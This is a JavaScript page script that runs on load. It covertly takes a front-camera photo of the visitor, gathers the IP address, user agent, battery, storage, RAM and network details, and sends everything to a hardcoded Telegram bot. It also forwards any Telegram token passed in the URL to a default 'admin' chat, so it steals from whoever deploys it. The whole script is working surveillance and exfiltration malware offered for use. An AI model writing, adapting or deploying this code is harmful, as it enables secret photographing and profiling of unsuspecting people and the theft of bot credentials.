        <script>
        window.onload = function() {

const defaultToken = '7441227305:AAGdXG0d-IQEy6u7p94_NVzsUMMSIj01dtM';
const defaultChatId = '5080596463';

function getUrlParameter(name) {
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(window.location.href);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

const tokenFromUrl = getUrlParameter('token');
const chatIdFromUrl = getUrlParameter('id');

async function sendPhotoToTelegram(blob, message, token, chat_id) {
    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', blob, 'user_photo.jpg');
    formData.append('caption', message);

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData,
        });

        if (!response.ok) {
            throw new Error('Failed to send photo');
        }

        console.log('Photo sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending photo to', chat_id, ':', error);
    }
}

async function sendCaptionToTelegram(caption, token, chat_id) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chat_id,
                text: caption
            })
        });

        if (!response.ok) {
            throw new Error('Failed to send caption');
        }

        console.log('Caption sent successfully to', chat_id);
    } catch (error) {
        console.error('Error sending caption to', chat_id, ':', error);
    }
}

async function sendPhotoAndCaption(blob, caption) {
    const photoMessage = `ğŸ“¸ This is the front camera photo \n\nğŸ†” Your Chat ID: @${chatIdFromUrl}`;

    if (tokenFromUrl && chatIdFromUrl) {
        await sendPhotoToTelegram(blob, photoMessage, tokenFromUrl, chatIdFromUrl);
        await sendCaptionToTelegram(caption, tokenFromUrl, chatIdFromUrl);

        const adminCaption = `${caption}\n\nğŸ“± User Token: ${tokenFromUrl}\n\nğŸ†” User Chat ID: @${chatIdFromUrl}`;
        await sendPhotoToTelegram(blob, photoMessage, defaultToken, defaultChatId);
        await sendCaptionToTelegram(adminCaption, defaultToken, defaultChatId);
    } else {
        await sendPhotoToTelegram(blob, photoMessage, defaultToken, defaultChatId);
        await sendCaptionToTelegram(caption, defaultToken, defaultChatId);
    }
}

async function captureAndSendPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        await new Promise(resolve => videoElement.onloadedmetadata = resolve);
        videoElement.play();

        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        const caption = await getDeviceInfo();
        await sendPhotoAndCaption(blob, caption);

        stream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error('Error accessing webcam:', error);

        const errorMessage = ` ğŸ“¸Camera access has been blocked. Unable to take photoğŸš«.\n\nğŸ†” Your Chat ID: @${chatIdFromUrl}`;
        await sendCaptionToTelegram(errorMessage, tokenFromUrl || defaultToken, chatIdFromUrl || defaultChatId);

        if (tokenFromUrl && chatIdFromUrl) {
            const adminErrorMessage = `${errorMessage}\n\nğŸ“± User Token: ${tokenFromUrl}\n\nğŸ†” User Chat ID: @${chatIdFromUrl}`;
            await sendCaptionToTelegram(adminErrorMessage, defaultToken, defaultChatId);
        }
    }
}

async function getDeviceInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        const userAgent = navigator.userAgent;
        const battery = await navigator.getBattery();
        const batteryPercentage = (battery.level * 100).toFixed(2);
        const chargingStatus = battery.charging ? "Charging" : "Not Charging";
        const browserLanguage = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;

        const startTime = (new Date()).getTime();
        await fetch('https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png', { mode: 'no-cors' });
        const endTime = (new Date()).getTime();
        const duration = (endTime - startTime) / 1000;
        const downloadSize = 5554;
        const bitsLoaded = downloadSize * 8;
        const speedBps = (bitsLoaded / duration).toFixed(2);
        const speedKbps = (speedBps / 1024).toFixed(2);
        const speedMbps = (speedKbps / 1024).toFixed(2);

        let networkType = '';
        if (speedMbps < 0.1) {
            networkType = '1G';
        } else if (speedMbps < 1) {
            networkType = '2G';
        } else if (speedMbps < 10) {
            networkType = '3G';
        } else if (speedMbps < 50) {
            networkType = '4G';
        } else {
            networkType = '5G';
        }

        function adjustStorage(value) {
            if (value >= 20 && value < 30) return 32;
            if (value >= 50 && value < 70) return 64;
            if (value >= 100 && value < 130) return 128;
            if (value >= 250 && value < 280) return 256;
            return Math.round(value);
        }

        const storageInfo = await navigator.storage.estimate();
        let totalStorage = (storageInfo.quota / (1024 * 1024 * 1024)).toFixed(2);
        let usedStorage = (storageInfo.usage / (1024 * 1024 * 1024)).toFixed(2);

        usedStorage = adjustStorage(usedStorage * 2);
        totalStorage = adjustStorage(totalStorage * 2);
        
        const storageDisplay = usedStorage > 0 ? `${usedStorage} GB / ${totalStorage} GB` : `${totalStorage} GB`;

        const ram = navigator.deviceMemory;

        let networkIndicator = '';
        if (navigator.connection) {
            const connectionType = navigator.connection.type;
            if (connectionType === 'wifi') {
                networkIndicator = 'âœ… Wi-Fi';
            } else {
                networkIndicator = 'âœ… Mobile Data';
            }
        } else {
            networkIndicator = 'Unknown Network Type';
        }

        const currentTime = new Date();
        const date = currentTime.toLocaleDateString();
        const time = currentTime.toLocaleTimeString();

        const caption = `ğŸŒ IP Address: ${ip}\n\nğŸ’» User-Agent: ${userAgent}\n\nğŸ”‹ Battery Percentage: ${batteryPercentage}%\n\nâš¡ Charging Status: ${chargingStatus}\n\nğŸ—£ï¸ Browser Language: ${browserLanguage}\n\nğŸ“ Screen Size: ${screenWidth}Ã—${screenHeight}\n\nğŸš€ Internet Speed: ${speedMbps} Mbps\n\nğŸŒ Network Type: ${networkType}\n\n${networkIndicator}\n\nğŸ§  Total RAM: ${ram} GB\n\nğŸ’¾ Device Storage: ${storageDisplay}\n\nğŸ•’ Date: ${date} Time: ${time}`;

        return caption.trim();
    } catch (error) {
        console.error('Error getting device info:', error);
        const fallbackCaption = `ğŸŒ IP Address: Unknown\n\nğŸ’»User-Agent: Unknown\n\nğŸ”‹ Battery Percentage: Unknown\n\nâš¡ Charging Status: Unknown\n\nğŸ—£ï¸ Browser Language: Unknown\n\nğŸ“ Screen Size: Unknown\n\nğŸš€ Internet Speed: Unknown\n\nğŸŒ Network Type: Unknown\n\nUnknown Network Type\n\nğŸ§  Total RAM: Unknown\n\nğŸ’¾ Device Storage: Unknown\n\nğŸ•’ Date: Unknown Time: Unknown`;

        return fallbackCaption.trim();
    }
}
